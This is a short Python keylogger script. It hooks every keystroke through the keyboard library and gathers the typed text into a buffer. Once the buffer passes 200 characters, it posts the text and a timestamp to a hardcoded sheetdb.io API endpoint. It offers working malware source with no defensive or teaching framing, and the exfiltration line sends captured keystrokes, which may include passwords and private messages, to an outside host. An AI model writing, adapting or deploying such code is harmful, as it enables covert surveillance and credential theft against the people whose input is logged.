from datetime import datetime
import keyboard
import requests

def internet_connection():

    try:
        response = requests.get('https://www.google.com/', timeout=5)
        
        return True
        
    except requests.ConnectionError:
    
        return False    
        

url = ' https://sheetdb.io/api/v1/aup7h1yb0yvlt '

elemet_delet = ['bas','verr.maj','haut','alt','ctrl']
 
lis = []

def on_k(e):
    
    if e.event_type  == keyboard.KEY_DOWN and e.name not in elemet_delet and internet_connection():
        
        if e.name != "alt gr":
        
            if e.name == "enter":
            
                lis.append("#")
                
            elif e.name == "decimal":
            
                lis.append(".")
                
            elif e.name == "space":
            
                lis.append(" ")
                
            elif e.name == "backspace":
            
                lis.pop()
                
            else:
            
                lis.append(e.name)
           
            x = "".join(str(x) for x in lis)
           
            print(x)
        
            if len(x) > 200 and e.name == "space":
                
                lis.clear()
                
                myobj = {'data[key]': x ,'data[date]': datetime.now() }
                
                xx = requests.post(url, data = myobj)
                
                print(xx.text)
                
                print('-------------')
    
keyboard.hook(on_k)

keyboard.wait()